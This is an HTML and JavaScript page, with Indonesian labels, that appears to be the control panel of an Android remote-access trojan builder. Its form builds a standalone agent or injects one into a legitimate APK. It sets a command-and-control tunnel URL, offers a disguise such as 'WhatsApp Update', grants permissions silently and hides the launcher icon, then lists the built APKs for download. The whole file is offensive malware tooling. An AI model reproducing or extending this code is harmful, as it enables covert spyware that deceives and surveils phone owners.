<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Build</title>
<link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
<div class="win" id="win"></div>
<div class="toast-wrap" id="tw"></div>
<script type="module">
import { $, api, toast, esc, fmt, jitter } from '/static/js/core.js';
import { chrome, statusbar, svg } from '/static/js/ui.js';

const win = $('#win');
chrome(win, {
  page: 'build', title: 'Build APK',
  actions: [
    '<button class="tbtn acc" id="go">' + svg('build') + 'BUILD</button>',
    '<button class="tbtn" id="rf">' + svg('reload') + 'REFRESH</button>',
    '<a class="tbtn" href="/pair">' + svg('qr') + 'QR APK</a>',
  ],
});
const body = document.createElement('div');
body.className = 'body pad';
win.appendChild(body);
statusbar(win, '<span class="st"><b>&#9679;</b> BUILDER</span><span class="st-r">v2.1.0</span>');

body.innerHTML = `
<div class="grid g2">
  <div class="card"><div class="card-h">${svg('build')}KONFIGURASI</div>
    <div class="card-b">
      <div class="field"><label>MODE</label>
        <select class="inp" id="mode">
          <option value="new">BUILD BARU (agent murni)</option>
          <option value="patch">INJECT KE APK RESMI</option>
        </select></div>
      <div class="field"><label>NAMA TAMPILAN</label>
        <input class="inp" id="name" placeholder="WhatsApp Update"></div>
      <div class="field"><label>PACKAGE NAME</label>
        <input class="inp" id="pkg" placeholder="com.app.saya (kosong = otomatis)"></div>
      <div class="field"><label>C2 PUBLIC URL</label>
        <input class="inp" id="c2" placeholder="https://xxxx.trycloudflare.com"></div>
      <div class="field"><label>WIZARD IZIN</label>
        <select class="inp" id="wizard">
          <option value="full">FULL &mdash; semua izin sekali klik</option>
          <option value="soft">SOFT &mdash; senyap, izin inti</option>
          <option value="none">NONE &mdash; tanpa wizard</option>
        </select></div>
      <label class="check"><input type="checkbox" id="hide" checked> SEMBUNYIKAN IKON DARI LAUNCHER</label>
      <div class="field" style="margin-top:8px"><label>APK SUMBER (mode inject)</label>
        <div class="file-drop" id="dApk">klik / drop APK resmi</div>
        <input type="file" id="fApk" accept=".apk" hidden></div>
      <div class="grid g2">
        <div class="field"><label>IKON</label>
          <div class="file-drop" id="dIcon">ikon</div><input type="file" id="fIcon" accept="image/*" hidden></div>
        <div class="field"><label>WALLPAPER</label>
          <div class="file-drop" id="dWall">wallpaper</div><input type="file" id="fWall" accept="image/*" hidden></div>
      </div>
      <button class="btn acc" id="go2" style="width:100%;height:30px;margin-top:5px">MULAI BUILD</button>
    </div></div>
  <div class="card"><div class="card-h">${svg('term')}ANTRIAN</div>
    <div style="overflow:auto;max-height:62vh"><table class="tbl">
      <thead><tr><th>Nama</th><th>Mode</th><th>Status</th><th>Ukuran</th><th></th></tr></thead>
      <tbody id="rows"></tbody></table></div></div>
</div>`;

function bind(drop, inp, label) {
  $(drop).onclick = () => $(inp).click();
  $(inp).onchange = () => {
    const f = $(inp).files[0];
    if (f) { $(drop).classList.add('has'); $(drop).textContent = label + ': ' + f.name; }
  };
}
bind('#dApk', '#fApk', 'APK');
bind('#dIcon', '#fIcon', 'ikon');
bind('#dWall', '#fWall', 'wallpaper');

async function doBuild() {
  const mode = $('#mode').value;
  if (mode === 'patch' && !$('#fApk').files[0]) { toast('Mode inject butuh APK sumber.', 'wn'); return; }
  const fd = new FormData();
  fd.append('mode', mode);
  fd.append('name', $('#name').value);
  fd.append('package', $('#pkg').value);
  fd.append('c2_url', $('#c2').value);
  fd.append('wizard', $('#wizard').value);
  fd.append('hide', $('#hide').checked ? '1' : '0');
  if ($('#fApk').files[0]) fd.append('apk', $('#fApk').files[0]);
  if ($('#fIcon').files[0]) fd.append('icon', $('#fIcon').files[0]);
  if ($('#fWall').files[0]) fd.append('wallpaper', $('#fWall').files[0]);
  $('#go2').disabled = true;
  try {
    const r = await api('/api/build/create', { method: 'POST', body: fd });
    toast('Build dimulai: ' + r.package, 'ok');
    list();
  } catch (e) { toast(e.message, 'wn'); }
  $('#go2').disabled = false;
}
$('#go').onclick = doBuild;
$('#go2').onclick = doBuild;
$('#rf').onclick = list;

async function list() {
  try {
    const d = await api('/api/build');
    $('#rows').innerHTML = d.builds.map((b) =>
      '<tr><td>' + esc(b.name || '-') + '<div class="dim" style="font-size:7.5px">' +
      esc(b.package || '') + '</div></td><td>' + esc(b.mode) + '</td>' +
      '<td><span class="tag ' + (b.status === 'selesai' ? 'on' : b.status === 'gagal' ? 'acc' : 'warn') + '">' +
      esc(b.status) + '</span></td><td>' + fmt.bytes(b.size) + '</td>' +
      '<td>' + (b.status === 'selesai'
        ? '<a class="btn xs ok" href="/api/build/' + esc(b.id) + '/download">UNDUH</a>' : '') +
      '</td></tr>').join('') || '<tr><td colspan="5" class="empty">belum ada build</td></tr>';
  } catch {}
}

api('/api/tunnel/status').then((s) => { if (s.url) $('#c2').value = s.url; }).catch(() => {});
list();
setInterval(list, jitter(4000, 2500));
</script>
</body>
</html>
